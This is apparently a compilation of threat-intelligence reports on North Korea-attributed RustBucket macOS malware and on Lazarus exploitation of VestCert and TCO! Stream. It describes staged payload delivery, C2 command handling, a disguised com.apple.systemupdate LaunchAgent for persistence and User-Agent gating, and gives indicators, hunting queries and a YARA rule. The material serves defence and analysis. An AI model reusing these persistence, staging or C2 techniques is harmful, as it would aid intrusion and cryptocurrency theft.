In the most recent samples, the payload retrieved by Stage 2 is written to disk as“ErrorCheck.zip” in _CS_DARWIN_USER_TEMP (aka $TMPDIR typically at /var/folders/…/../T/) before being executed on the victim’s device.
RustBucket Stage 3 | New Variant Drops Persistence LaunchAgent
The Stage 3 payload has so far been seen in two distinct variants:
•	A: 182760cbe11fa0316abfb8b7b00b63f83159f5aa Stage3
•	B: b74702c9b82f23ebf76805f1853bc72236bee57c ErrorCheck, System Update
Both variants are Mach-O universal binaries compiled from Rust source code. Variant A is considerably larger than B, with the universal binary of the former weighing in at 11.84MB versus 8.12MB for variant B. The slimmed-down newer variant imports far fewer crates and makes less use of the sysinfo crate found in both. Notably, variant B does away with the webT class seen in variant A for gathering environmental information and checking for execution in a virtual machine via querying the SPHardwareDataType value of system_profiler.
 The webT class appears in variant A of the Stage 3 payload
However, variant B has not scrubbed all webT artifacts from the code and reference to the missing module can still be found in the strings.
18070 0x0032bdf4 0x10032bdf4 136  137                            
ascii   /Users/carey/Dev/MAC_DATA/MAC/Trojan/webT/target/x86_64-apple-darwin/release/deps/updator-7a0e7515c124fac6.updator.ab9d0eaa-cgu.0.rcgu.o
 A string referencing the missing webT module can still be found in Stage 3 variant B
The substring “Trojan”, which does not appear in earlier variants, is also found in the file path referenced by the same string.
Importantly, variant B contains a persistence mechanism that was not present in the earlier versions of RustBucket. This takes the form of a hardcoded LaunchAgent, which is written to disk at ~/Library/LaunchAgents/com.apple.systemupdate.plist. The ErrorCheck file also writes a copy of itself to ~/Library/Metadata/System Update and serves as the target executable of the LaunchAgent.
Since the Stage 3 requires a URL as a launch parameter this is provided in the property list as a Program Argument. Curiously, the URL passed to ErrorCheck on launch is appended to this hardcoded URL in the LaunchAgent plist.
 RustBucket LaunchAgent concatenates the hardcoded URL with the one supplied at launch
Appending the supplied  value to the hardcoded URL can be clearly seen in the code, though whether this is an error or accounted for in the way the string is parsed by the binary we have yet to determine.
Much of the malware functionality found in variant A’s webT methods is, in variant B, now buried in the massive sym.updator::main function. This is responsible for surveilling the environment and parsing the arguments received at launch, processing commands, gathering disk information and more. This massive function is over 22Kb and contains 501 basic blocks. Our analysis of this is ongoing but aside from the functions previously described by Elastic, this function also gathers disk information, including whether the host device’s disk is SSD or the older, rotational platter type.
 Among updator::main’s many tasks is gathering disk information
After gathering environmental information, the malware calls sym.updator::send_request to post the data to the C2 using the following User-Agent string (this time not in lowercase):
Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)
The malware compares the response against two hardcoded values, 0x31 and 0x30.
 Checking the values of the response from the C2
In the sample analyzed by Elastic, the researchers reported that 0x31 causes the malware to self-terminate while 0x30 allows the operator to drop a further payload in the _CS_DARWIN_USER_TEMP directory.
The choice of Rust and the complexity of the Stage 3 binaries suggest the threat actor was willing to invest considerable effort to thwart analysis of the payload. As the known C2s were unresponsive by the time we conducted our analysis, we were unable to obtain a sample of the next stage of the malware, but already at this point in the operation the malware has gathered a great deal of host information, enabled persistence and opened up a backdoor for further malicious activity.
SentinelOne Protects Against RustBucket Malware
SentinelOne Singularity protects customers from known components of the RustBucket malware. Attempts to install persistence mechanisms on macOS devices are also dynamically detected and blocked by the agent.
 SentinelOne Agent User Interface SentinelOne Singularity Console
Conclusion
The RustBucket campaign highlights that the threat actor, whom previous researchers have confidently attributed to DPRK’s BlueNoroff APT, has invested considerable resources in multi-stage malware aimed specifically at macOS users and is evolving its attempts to thwart analysis by security researchers.
The extensive effort made to evade analysis and detection in itself shows the threat actor is aware of the growing adoption of security software by organizations with macOS devices in their fleets, as security teams have increasingly begun to see the need for better protection than provided out-of-the-box. SentinelOne continues to track the RustBucket campaign and our analysis of the known payloads is ongoing.
To see how SentinelOne can help safeguard your organization’s macOS devices, contact us for more information or request a free demo.
Indicators of Compromise
Stage 2 Mach-Os
SHA1	Arch	Lang
0df7e1d3b3d54336d986574441778c827ff84bf2	FAT	objc
27b101707b958139c32388eb4fd79fcd133ed880	ARM	objc
338af1d91b846f2238d5a518f951050f90693488	ARM	objc
5304031dc990790a26184b05b3019b2c5fa7022a	FAT	swift
72167ec09d62cdfb04698c3f96a6131dceb24a9c	ARM	objc
7f9694b46227a8ebc67745e533bc0c5f38fdfa59	ARM	objc
963a86aab1e450b03d51628797572fe9da8410a2	FAT	objc
9676f0758c8e8d0e0d203c75b922bcd0aeaa0873	FAT	objc
a7f5bf893efa3f6b489efe24195c05ff87585fe3	ARM	swift
ac08406818bbf4fe24ea04bfd72f747c89174bdb	x86	objc
acf1b5b47789badb519ff60dc93afa9e43bbb376	x86	swift
b02922869e86ad06ff6380e8ec0be8db38f5002b	x86	objc
d5971e8a3e8577dbb6f5a9aad248c842a33e7a26	x86	objc
e0e42ac374443500c236721341612865cd3d1eec	FAT	objc
e275deb68cdff336cb4175819a09dbaf0e1b68f6	FAT	swift
ed4f16b36bc47a701814b63e30d8ea7a226ca906	FAT	swift
fd1cef5abe3e0c275671916a1f3a566f13489416	x86	objc
Stage 3 Version A Mach-Os
SHA1	Arch	Lang
182760cbe11fa0316abfb8b7b00b63f83159f5aa	FAT	rust
3cc19cef767dee93588525c74fe9c1f1bf6f8007	ARM	rust
831dc7bc4a234907d94a889bcb60b7bedf1a1e13	x86	rust
8e7b4a0d9a73ec891edf5b2839602ccab4af5bdf	x86	rust
Stage 3 Version B Mach-Os
SHA1	Arch	Lang
14165777bc48b49eb1fa9ad8fe3cb553565c26c2	FAT	rust
69f24956fb75beb9b93ef974d873914500e35601	ARM	rust
8a1b32ab8c2a889985e530425ae00f4428c575cc	FAT	rust
8f7da0348001461fc5a1da99b89c571050de0aff	x86	rust
a973d201c23b68c5d25ba8447b04f090c20bf6d4	ARM	rust
b74702c9b82f23ebf76805f1853bc72236bee57c	FAT	rust
cd8f41b91e8f1d8625e076f0a161e46e32c62bbf	x86	rust
Malicious PDFs
SHA1	Name
469236d0054a270e117a2621f70f2a494e7fb823	DOJ Report on Bizlato Investigation.pdf
574bbb76ef147b95dfdf11069aaaa90df968e542	Readme.pdf
7e69cb4f9c37fad13de85e91b5a05a816d14f490	InvestmentStrategy(Protected).pdf
7f8f43326f1ce505a8cd9f469a2ded81fa5c81be	Jump Crypto Investment Agreement.pdf
be234cb6819039d6a1d3b1a205b9f74b6935bbcc	DOJ Report on Bizlato Investigation_asistant.pdf
e7158bb75adf27262ec3b0f2ca73c802a6222379	Daiwa Ventures.pdf
Stage 1 Applications (.zip)
0738687206a88ecbee176e05e0518effa4ca4166
0be69bb9836b2a266bfd9a8b93bb412b6e4ce1be
5933f1a20117d48985b60b10b5e42416ac00e018
7a5d57c7e2b0c8ab7d60f7a7c7f4649f33fea8aa
7e1870a5b24c78a5e357568969aae3a5e7ab857d
89301dfdc5361f1650796fecdac30b7d86c65122
9121509d674091ce1f5f30e9a372b5dcf9bcd257
9a5f6a641cc170435f52c6a759709a62ad5757c7
a1a85cba1bc4ac9f6eafc548b1454f57b4dff7e0
ca59874172660e6180af2815c3a42c85169aa0b2
d9f1392fb7ed010a0ecc4f819782c179efde9687
e2bcdfbda85c55a4d6070c18723ba4adb7631807
AppleScript main.scpt
dabb4372050264f389b8adcf239366860662ac52
Communications
cloud[.]dnx.capital
crypto.hondchain[.]com.
File Paths
$TMPDIR/ErrorCheck.zip
/Users/Shared/1.zip
/Users/Shared/Internal PDF Viewer.app
/Users/Shared/.pd
~/Library/Metadata/System Update
~/Library/LaunchAgents/com.apple.systemupdate.plist
 
The DPRK strikes using a new variant of RUSTBUCKET
A DPRK campaign using a new variant of the RUSTBUCKET malware is underway with updated capabilities and reduced signature detection.
16 min readAttack pattern,Activity group
 
Key takeaways
•	The RUSTBUCKET malware family is in an active development phase, adding built-in persistence and focusing on signature reduction.
•	REF9135 actors are continually shifting their infrastructure to evade detection and response.
•	The DPRK continues financially motivated attacks against cryptocurrency service providers.
•	If you are running Elastic Defend, you are protected from REF9135
Preamble
The Elastic Security Labs team has detected a new variant of the RUSTBUCKET malware, a family that has been previously attributed to the BlueNorOff group by Jamf Threat Labs in April 2023.
This variant of RUSTBUCKET, a malware family that targets macOS systems, adds persistence capabilities not previously observed and, at the time of reporting, is undetected by VirusTotal signature engines. Elastic Defend behavioral and prebuilt detection rules provide protection and visibility for users. We have also released a signature to prevent this malware execution.
The research into REF9135 used host, binary, and network analysis to identify and attribute intrusions observed by this research team, and other intelligence groups, with high confidence to the Lazarus Group; a cybercrime and espionage organization operated by the Democratic People’s Republic of North Korea (DPRK).
This research will describe:
•	REF9135’s use of RUSTBUCKET for sustained operations at a cryptocurrency payment services provider
•	Reversing of an undetected variant of RUSTBUCKET that adds a built-in persistence mechanism
•	How victimology, initial infection, malware, and network C2 intersections from first and third-party collection align with previous Lazarus Group reporting
RUSTBUCKET code analysis
Overview
Our research has identified a persistence capability not previously seen in the RUSTBUCKET family of malware, leading us to believe that this family is under active development. Additionally, at the time of publication, this new variant has zero detections on VirusTotal and is leveraging a dynamic network infrastructure methodology for command and control.
 
Stage 1
During Stage 1, the process begins with the execution of an AppleScript utilizing the %2Fusr%2Fbin%2Fosascript command. This AppleScript is responsible for initiating the download of the Stage 2 binary from the C2 using cURL. This session includes the string pd in the body of the HTTP request and cur1-agent as the User-Agent string which saves the Stage 2 binary to %2Fusers%2Fshared%2F.pd, (7887638bcafd57e2896c7c16698e927ce92fd7d409aae698d33cdca3ce8d25b8).
 
Stage 2
The Stage 2 binary ( .pd ) is compiled in Swift and operates based on command-line arguments. The binary expects a C2 URL to be provided as the first parameter when executed. Upon execution, it invokes the downAndExec function, which is responsible for preparing a POST HTTP request. To initiate this request, the binary sets the User-Agent string as mozilla%2F4.0 (compatible; msie 8.0; windows nt 5.1; trident%2F4.0) and includes the string pw in the body of the HTTP request.
 
During execution, the malware utilizes specific macOS APIs for various operations. It begins with NSFileManager's temporaryDirectory function to obtain the current temporary folder, then generates a random UUID using NSUUID's UUID.init method. Finally, the malware combines the temporary directory path with the generated UUID to create a unique file location and writes the payload to it.
Once the payload, representing Stage 3 of the attack is written to disk, the malware utilizes NSTask to initiate its execution.
 
Stage 3
In Stage 3, the malware (9ca914b1cfa8c0ba021b9e00bda71f36cad132f27cf16bda6d937badee66c747) is a FAT macOS binary that supports both ARM and Intel architectures written in Rust. It requires a C2 URL to be supplied as a parameter.
The malware initiates its operations by dynamically generating a 16-byte random value at runtime. This value serves as a distinctive identifier for the specific instance of the active malware. Subsequently, the malware proceeds to gather comprehensive system information, including:
•	Computer name
•	List of active processes
•	Current timestamp
•	Installation timestamp
•	System boot time
•	Status of all running processes within the system
The malware establishes its initial connection to the C2 server by transmitting the gathered data via a POST request. The request is accompanied by a User-Agent string formatted as Mozilla%2F4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident%2F4.0).
Upon receiving the request, the C2 server responds with a command ID, which serves as an instruction for the malware. The malware is designed to handle only two commands.
Command ID 0x31
This command directs the malware to self-terminate.
Command ID 0x30
This command enables the operator to upload malicious Mach-O binaries or shell scripts to the system and execute them. The payload is stored in a randomly generated temporary path and created within the current user TMP directory following the naming convention of $TMPDIR%2F.\<8 random digits\>
Below is a summary of the command structure, indicating the constants, arguments, and payload components for easy comprehension.
 
The malware proceeds by granting execution permissions to the uploaded file using the chmod API.
After executing the payload, the malware sends a status update to the server, notifying it of the completed execution, and then sleeps for 60 seconds. Following this delay, the malware loops to collect system information once again and remains in a waiting state, anticipating the arrival of the next command from the server
The undetected version of RUSTBUCKET
Using code similarities from the sample in our telemetry, we searched VirusTotal and identified an undetected variant of RUSTBUCKET.
As of the publication of this research, the newly discovered version of the malware has not been flagged by any antivirus engines on VirusTotal. A thorough analysis of the sample brought to light the addition of a new persistence capability and C2 infrastructure. The behavioral rules for Elastic Defend prevent, and Elastic’s prebuilt detection rules identify, this activity. We have also released a signature that will prevent this new variant of RUSTBUCKET.
 
Persistence
A predominant method utilized by malware to achieve persistence on macOS is through the utilization of LaunchAgents. In macOS, users have individual LaunchAgents folders within their Library directory, enabling them to define code that executes upon each user login. Additionally, a system-level LaunchAgents folder exists, capable of executing code for all users during the login process. Elastic Defend monitors for the creation of LaunchAgents and LaunchDaemons containing malicious or suspicious values as a way to detect these persistence techniques.
In the case of this updated RUSTBUCKET sample, it establishes its own persistence by adding a plist file at the path %2FUsers%2F\%2FLibrary%2FLaunchAgents%2Fcom.apple.systemupdate.plist , and it copies the malware’s binary to the following path %2FUsers%2F\%2FLibrary%2FMetadata%2FSystem Update.
 
There are several elements of the plist file, using standard true%2Ffalse or string values:
•	Label: The key "Label" specifies the name of the LaunchAgent, which in this case is com.apple.systemupdate. This expects a string value.
•	RunAtLoad: This indicates that the LaunchAgent should execute its associated code immediately upon loading, specifically during system startup or user login. This expects a true%2Ffalse value.
•	LaunchOnlyOnce: This prevents the malware from being executed multiple times concurrently and expects a true%2Ffalse value.
•	KeepAlive: This key instructs the system to keep the LaunchAgent running and relaunch it if it terminates unexpectedly. This expects a true%2Ffalse value.
•	ProgramArguments: The "ProgramArguments" key specifies an array of strings that define the program or script to be executed by the LaunchAgent. This expects a string value and in this case, the LaunchAgent executes the file located at "%2FUsers%2F\%2FLibrary%2FMetadata%2FSystem Update" and provides the C2 URL "https:%2F%2Fwebhostwatto.work[.]gd" as an argument to the malware.
RUSTBUCKET and REF9135 analysis
Overview
The RUSTBUCKET campaign has previously been associated with BlueNorOff by Jamf and Sekoia.io. BlueNorOff is believed to be operating at the behest of the DPRK for the purposes of financial gain in order to ease the strain of global sanctions. BlueNorOff is a sub-unit of the overarching DPRK offensive cyber attack organization, the Lazarus Group. The 2016 Bangladesh Bank robbery stands out as BlueNorOff's most notorious attack, wherein their objective was to illicitly transfer over $850M from the Federal Reserve Bank of New York account owned by Bangladesh Bank, the central bank of Bangladesh, by exploiting the SWIFT network.
As an analyst note, if you’re interested in a tremendously verbose and detailed walkthrough of this intrusion, Geoff White and Jean Lee released a 19-part podcast through the BBC World Service that is an unbelievable account of this event.
Networking infrastructure
The persistence mechanism identified previously calls out to https:%2F%2Fwebhostwatto.work[.]gd. Third-party research into this URL indicates that 12%2F89 VirusTotal vendors have identified it as malicious, and it exists within a community collection documenting the DangerousPassword phishing campaign.
 
VirusTotal last saw the domain pointing to 104.168.167[.]88. Which has been specifically identified in a Sekoia.io blog in May as part of BlueNorOff’s RUSTBUCKET campaign.
 
Further connecting webhostwatto.work[.]gd to DangerousPassword, BlueNorOff, and the DPRK campaigns, this domain shares a TLS leaf certificate fingerprint hash ( 1031871a8bb920033af87078e4a418ebd30a5d06152cd3c2c257aecdf8203ce6 ) with another domain, companydeck[.]online.
companydesk[.]online is included in the VirusTotal Graph (VirusTotal account required) for APT38, which is also known as DangerousPassword, BlueNorOff, etc.
 
DangerousPassword and BlueNorOff are campaigns that have both been previously associated with the DPRK.
Using the IP address (64.44.141[.]15) for our initial C2 domain, crypto.hondchain[.]com, we uncovered 3 additional C2 domains:
•	starbucls[.]xyz
•	jaicvc[.]com
•	docsend.linkpc[.]net (dynamic DNS domain)
While there are only 5 hosts (4 total domains) registered to the C2 IP address (indicating that this was not a high-capacity hosting server), we looked for additional relationships to increase the association confidence between the domains. To do this, we replicated the same fingerprinting process previously used with webhostwatto.work[.]gd. The TLS fingerprint hash for starbucls[.]xyz ( 788261d948177acfcfeb1f839053c8ee9f325bd6fb3f07637a7465acdbbef76a ) is the same fingerprint as jaicvc[.]com.
With these two domains having the same TLS fingerprint hash and the fact that they were both registered to the IP address, we were able to cluster these atomic entities, and their siblings, together with high confidence:
•	All hosts were registered to 64.44.141[.]15
•	starbucls[.]xyz and crypto.hondchain[.]com were observed being used by our malware samples
•	starbucls[.]xyz and jaicvc[.]com shared a TLS fingerprint
 
Looking at the “First” column (when they were first observed through 3rd party passive DNS), these hosts are being created rapidly, likely as an attempt to stay ahead of detection efforts by research teams. We are associating the following domains and IP address to the REF9135 campaign with high confidence:
•	starbucls[.]xyz
•	jaicvc[.]com
•	crypto.hondchain[.]com
•	64.44.141[.]15
We have not observed docsend.linkpc[.]net being used with the RUSTBUCKET samples we analyzed. However, its shared IP registration and host siblings lead us to state with a moderate degree of confidence that it is directly related to RUSTBUCKET and REF9135 as C2 infrastructure; and a high degree of confidence that it is malicious (shared infrastructure as part of other campaigns).
Defense evasion
The campaign owners used techniques to hinder the collection of Stage 2 and Stage 3 binaries by analysts who may have overlooked User-Agent strings in their investigations, as well as internet scanners and sandboxes focused on collecting malicious binaries.
As outlined in the Stage 1 section, there is a specific User-Agent string ( cur1-agent ) that is expected when downloading the Stage 2 binary, if you do not use the expected User-Agent, you will be provided with a 405 HTTP response status code (Method Not Allowed).
It also appears that the campaign owners are monitoring their payload staging infrastructure. Using the expected User-Agent for the Stage 3 binary download (mozilla%2F4.0 (compatible; msie 8.0; windows nt 5.1; trident%2F4.0)), we were able to collect the Stage 3 binary.
Finally, we observed REF9135 changing its C2 domain once we began to collect the Stage 2 and 3 binaries for analysis. When making subsequent requests to the original server (crypto.hondchain[.]com), we received a 404 HTTP response status code (Not Found) and shortly after, a new C2 server was identified (starbucls[.]xyz). This could be because we caught the binary before it was rolled off as part of a normal operational security practice (don’t leave your valuable payload attached to the Internet to be discovered) or because they observed a connection to their infrastructure that was not from their targeted network.
Of note, while the User-Agent strings above could initially appear to be the default cURL or Firefox User-Agents strings to an analyst, they are not. The default cURL User-Agent string is curl%2Fversion.number whereas the malware uses cur1-agent (using a 1 in place of the l in “curl”). Additionally, the “Firefox” string is all lowercase (mozilla%2F4.0 (compatible; msie 8.0; windows nt 5.1; trident%2F4.0)), unlike actual Firefox User-Agent strings which are camel-cased.
This requirement to download payloads allows the attackers to restrict distribution to only requestors who know the correct UA string. This provides strong protection against both scanning services and researchers, who would otherwise have early access to hosted malicious files for analysis and detection engineering.
Victimology
The REF9135 victim is a venture-backed cryptocurrency company providing services to businesses such as payroll and business-to-business transactions with a headquarters in the United States. This victim fits the mold from prior reporting on BlueNorOff targeting organizations with access to large amounts of cryptocurrency for theft.
Observed adversary tactics and techniques
Elastic uses the MITRE ATT&CK framework to document common tactics, techniques, and procedures that advanced persistent threats use against enterprise networks.
Tactics
Tactics represent the why of a technique or sub-technique. It is the adversary’s tactical goal: the reason for performing an action.
•	Initial access
•	Execution
•	Defense evasion
•	Discovery
•	Lateral movement
•	Command and control
Diamond model
Elastic Security utilizes the Diamond Model to describe high-level relationships between adversaries, capabilities, infrastructure, and victims of intrusions. While the Diamond Model is most commonly used with single intrusions, and leveraging Activity Threading (section 8) as a way to create relationships between incidents, an adversary-centered (section 7.1.4) approach allows for a, although cluttered, single diamond.
 
Detection logic
Prevention
•	MacOS.Trojan.RustBucket
•	Persistence via Suspicious Launch Agent or Launch Daemon
Hunting queries
The events for EQL are provided with the Elastic Agent using the Elastic Defend integration. Hunting queries could return high signals or false positives. These queries are used to identify potentially suspicious behavior, but an investigation is required to validate the findings.
EQL queries
Using the Timeline section of the Security Solution in Kibana under the “Correlation” tab, you can use the below EQL queries to hunt for behaviors observed in REF9135.
Suspicious Curl File Download via Osascript
process where process.parent.name : "osascript" and process.name : "curl" and process.args : "-o"
Suspicious URL as argument to Self-Signed Binary
process where event.type == "start" and event.action == "exec" and 
 process.code_signature.trusted == false and 
 process.code_signature.signing_id regex~ """[A-Za-z0-9\_\s]{2,}\-[a-z0-9]{40}""" and 
 process.args : "http*" and process.args_count <= 3
YARA
Elastic Security has created YARA rules to identify this activity. Below are YARA rules to identify the RUSTBUCKET malware:
 rule MacOS_Trojan_RustBucket {
    meta:
        author = "Elastic Security"
        creation_date = "2023-06-26"
        last_modified = "2023-06-26"
        license = "Elastic License v2"
        os = "MacOS"
        arch = "x86"
        category_type = "Trojan"
        family = "RustBucket"
        threat_name = "MacOS.Trojan.RustBucket"
        reference_sample = "9ca914b1cfa8c0ba021b9e00bda71f36cad132f27cf16bda6d937badee66c747"
        severity = 100

    strings:
        $user_agent = "User-AgentMozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
        $install_log = "/var/log/install.log"
        $timestamp = "%Y-%m-%d %H:%M:%S"
    condition:
        all of them
}
References
The following were referenced throughout the above research:
•	https:%2F%2Fwww.jamf.com%2Fblog%2FBlueNorOff-apt-targets-macos-rustbucket-malware%2F
•	https:%2F%2Fblog.sekoia.io%2FBlueNorOffs-rustbucket-campaign%2F
Observations
All observables are also available for download in both ECS and STIX format in a combined zip bundle.
The following observables were discussed in this research.
Observable	Type	Name	Reference
webhostwatto.work[.]gd	Domain	N%2FA	REF9135 C2 domain
crypto.hondchain[.]com	Domain	N%2FA	REF9135 C2 domain
starbucls[.]xyz	Domain	N%2FA	REF9135 C2 domain
jaicvc[.]com	Domain	N%2FA	REF9135 C2 domain
docsend.linkpc[.]net	Domain	N%2FA	REF9135 C2 domain
companydeck[.]online	Domain	N%2FA	Associated by REF9135 TLS fingerprint hash
104.168.167[.]88	ipv4	N%2FA	REF9135 C2 IP address
64.44.141[.]15	ipv4	N%2FA	REF9135 C2 IP address
788261d948177acfcfeb1f839053c8ee9f325bd6fb3f07637a7465acdbbef76a	x509-certificate	jaicvc[.]com	REF9135 C2 TLS fingerprint hash
1031871a8bb920033af87078e4a418ebd30a5d06152cd3c2c257aecdf8203ce6	x509-certificate	webhostwatto.work[.]gd	REF9135 C2 TLS fingerprint hash
9ca914b1cfa8c0ba021b9e00bda71f36cad132f27cf16bda6d937badee66c747	SHA-256	N%2FA	MacOS.Trojan.RustBucket
7fccc871c889a4f4c13a977fdd5f062d6de23c3ffd27e72661c986fae6370387	SHA-256	N%2FA	MacOS.Trojan.RustBucket
ec8f97d5595d92ec678ffbf5ae1f60ce90e620088927f751c76935c46aa7dc41	SHA-256	N%2FA	MacOS.Trojan.RustBucket
de81e5246978775a45f3dbda43e2716aaa1b1c4399fe7d44f918fccecc4dd500	SHA-256	ErrorCheck	MacOS.Trojan.RustBucket
4f49514ab1794177a61c50c63b93b903c46f9b914c32ebe9c96aa3cbc1f99b16	SHA-256	N%2FA	MacOS.Trojan.RustBucket
fe8c0e881593cc3dfa7a66e314b12b322053c67cbc9b606d5a2c0a12f097ef69	SHA-256	N%2FA	MacOS.Trojan.RustBucket
7887638bcafd57e2896c7c16698e927ce92fd7d409aae698d33cdca3ce8d25b8	SHA-256	%2FUse	

 
Posted By sujeong , Jun 08, 2023
Lazarus attack group exploits vulnerability in domestic financial security solution
As previously documented in the ASEC blog, the Lazarus attack group leverages vulnerabilities in INISAFE CrossWeb EX and MagicLine4NX in their attacks.
•	New malware of Lazarus attack group exploiting INITECH process (2022.04.18)
•	Lazarus Attack Group Uses BYOVD Techniques to Defeat Antivirus Programs (Oct. 24, 2022)
While monitoring the activities of the Lazarus attack group, ASEC (AhnLab Security Emergency Response Center) found that in addition to INISAFE CrossWeb EX and MagicLine4NX, which had been exploited in the past, VestCert and TCO! We have newly identified the circumstances under which Stream's 0-day vulnerability is being exploited.
VestCert is a non-ActiveX web security software produced by Yetisoft and has a TCO! Stream is an enterprise asset management program of MLSoft Co., Ltd., and both solutions are used by many companies in Korea.
Lazarus continues to find new vulnerabilities in its domestic software and exploit it in attacks, so companies using the software are advised to patch it to the latest version.
Download malware using vulnerabilities in VestCert
Attackers use the watering hole method to infiltrate the company for the first time. When a user uses a web browser on a vulnerable version of VestCert to visit a specific website with a malicious script inserted, regardless of the type of web browser, PowerShell is executed due to a vulnerability in the execution of third-party libraries in the VestCert software, which contacts the C2 server to download and execute the malware as shown below.
 
[Picture] PowerShell command to download malware (WinSync.dll) executed with the VestCert vulnerability
 
TCO! Internal propagation of malware using vulnerabilities in Stream
Attackers can use TCO! It is using a vulnerability in Stream. TCO! Stream consists of a server and a client, and provides functions such as software distribution and remote control from the server to the client. The client is always listening on TCP port 3511 to communicate with the server, and the attacker uses his own malware to generate a command packet to download and execute a specific file from the server and deliver it to the client. The client that receives this command is responsible for the TCO! It accesses the Stream server to download and execute the malicious file prepared by the attacker.
The attacker-generated malware is executed with the following command-line structure. The meaning of each parameter on the command line is as follows:
 
•	: Malicious filenames (MicrosoftVSA.bin, MicroForic.tlb, matrox86.bic, matrox86.tcm, matrox86.tcm, wincert.bin, mseng.bin)
•	: The Device ID of the TCO server.
•	: The IP of the destination client system.
•	: Port on the destination client machine (3511)
•	: The Job ID used on the server.
 
Some of the decrypted command data (for analysis)
•	Deployment file location: C:\Packages\\\\
•	Run command: loadconf.exe –rt5y65i8##7poi88++5t4t54t54t5n
The above command downloads the backdoor downloader (loadconf.exe) to the C:\Temp\ path and executes it with arguments.
 
Vulnerability Information
ASEC has been abused this time by VestCert and TCO! We analyzed the vulnerability of Stream and reported it to KISA, and the information was also passed on to the relevant company, and the vulnerability has now been patched. On March 13, a security advisory post titled "Financial Security Solution Update Recommendation" was posted on KISA's Security Vulnerability Information Portal (https://knvd.krcert.or.kr/detailSecNo.do?IDX=5881). However, it has been confirmed that many of these software are still vulnerable because they are not automatically updated. On systems where the software is installed, it is recommended to manually uninstall and reinstall it.
VestCert and TCO! Information about Stream's vulnerabilities was disclosed on the ASEC blog, and the vulnerability and fixes of each software are as follows.
VestCert
•	Vulnerability Information: Certified Authentication Solution (VestCert) Vulnerability Warning and Update Advisory (2023.03.17)
•	Affected version: 2.3.6 ~ 2.5.29
•	Resolution version: 2.5.30
TCO! Stream
•	Vulnerability Information: Asset Management Solutions (TCO! Stream) Vulnerability Warning and Update Advisory (2023.03.07)
•	Affected version: 8.0.22.1115 and earlier
•	Resolution version: 8.0.23.215
AhnLab detects the following malware, malicious behaviors and URLs.
[File Diagnostic]
•	Trojan/Win.Lazardoor (2023.01.11.03)
•	Data/BIN. EncodedPE (2023.01.12.00)
•	Data/BIN. EncodedPE (2023.01.12.00)
•	Trojan/Win.Lazardoor (2022.01.05.01)
•	Trojan/Win.Lazardoor (2023.01.11.03)
•	Data/BIN. EncodedPE (2023.01.12.00)
•	Data/BIN. EncodedPE (2023.01.12.00)
•	Trojan/Win.Agent (2023.01.12.03)
•	Trojan/Win.LazarLoader(2023.01.21.00)
[Behavioral Diagnosis]
•	InitialAccess/EDR. Lazarus.M10963
•	Execution/EDR. Event.M10769
•	Injection/EDR. Lazarus.M10965
•	Fileless/EDR. Event.M11080
[IOC]
MD5 / SHA1
•	E73EAB80B75887D4E8DD6DF33718E3A5
•	BA741FA4C7B4BB97165644C799E29C99
•	064D696A93A3790BD3A1B8B76BAAEEF3
•	8ADEEB291B48C97DB1816777432D97FD
•	67D306C163B38A06E98DA5711E14C5A7
•	C09B062841E2C4D46C2E5270182D4272
•	747177AAD5AEF020B82C6AEABE5B174F
•	E7C9BF8BF075487A2D91E0561B86D6F5
•	55F0225D58585D60D486A3CC7EB93DE5
•	EC5D5941522D947ABD6C9E82E615B46628A2155F (SHA1)
•	3CA6ABF845F3528EDF58418E5E42A9C1788EFE7A (SHA1)
URL
•	hxxps://www.gongsilbox[.] com/board/bbs.asp
•	hxxp://www.sinae.or[.] kr/sub01/index.asp
•	hxxps://www.bcdm.or[.] kr/board/type3_D/edit.asp
•	hxxps://www.hmedical.co[.] kr/include/edit.php
•	hxxps://www.coupontreezero[.] com/include/bottom.asp
•	hxxp://ksmarathon[.] com/admin/excel2.asp
•	hxxps://www.daehang[.] com/member/logout.asp
•	hxxps://swt-keystonevalve[.] com/data/content/cache/cache.php?mode=read
•	hxxps://www.materic.or[.] kr/files/board/equip/equip_ok.asp
Detailed information on related IOCs and related analysis can be found through AhnLab's next-generation threat intelligence platform 'AhnLab TIP' subscription service.
 
Bluenoroff’s RustBucket campaign
In April 2023, fellow security researchers at Jamf published a report on Bluenoroff’s RustBucket, a newly observed malware targeting macOS platform. Sekoia.io analysts further investigated Bluenoroff’s infrastructure and share their findings in this report.
APT
 
Bluenoroff
 
CTI
 
North Korea
 
 
Jamila B., Kilian Seznec, Charles M. and TDR (Threat Detection & Research) TeamMay 22 2023
 
 1014
 Read it later
 
15 minutes reading
Like DPRK soldiers
In April 2023, fellow security researchers at Jamf published a report on Bluenoroff’s RustBucket, a newly observed malware targeting macOS platform. Sekoia.io analysts further investigated Bluenoroff’s infrastructure and share their findings in this report.
Bluenoroff is a North Korea-nexus intrusion set, allegedly subordinated to RGB’s Bureau 121 tasked with revenue generation since at least 2015. Since 2017, Bluenoroff was observed conducting financially-driven campaigns targeting cryptocurrency exchanges and venture capital related entities in Europe, Asia, the U.S. and the UAE.
Since the end of 2021 and through 2022, Bluenoroff continuously used the same TTPs. However, Sekoia.io analysts observed recent modifications, as described in the report previously referenced.
Bluenoroff’s gone macOS
Since at least December 2022, Bluenoroff was observed leveraging RustBucket, a Rust and Objective-C written malware targeting macOS running systems. This recent Bluenoroff activity illustrates how intrusion sets turn to cross-platform language in their malware development efforts, further expanding their capabilities highly likely to broaden their victimology. While other DPRK-nexus intrusion sets, including Lazarus, Kimsuky and more recently Reaper were already reported targeting macOS, it is the first time Bluenoroff was observed targeting macOS users, to the best of our knowledge.
The RustBucket infection chain consists of a macOS installer that installs a backdoored, yet functional, PDF reader. The fake PDF reader then requires opening a specific PDF file that operates as a key to trigger the malicious activity.
When opened in a classical PDF reader, the PDF document displays a message asking the user to open the document in the proper reader (i.e. the backdoored one). When opened in this reader, the PDF displays a nine pages document about a venture capital company that appears to be the printout of a legit company’s website. The fake PDF reader uses a hardcoded 100-bytes XOR key to decrypt the new content of the document and the C2 server configuration.
 
Figure 1. Key PDF document when opened in a PDF Reader
When the proper PDF file is submitted to the fake PDF reader, it requests its C2 server encoded in the PDF file using an HTTP POST request to download and execute a new payload. The new payload is the backdoor component of the RustBucket kill chain, collecting information about the compromised system, sending it to its C2 server and requesting for commands.
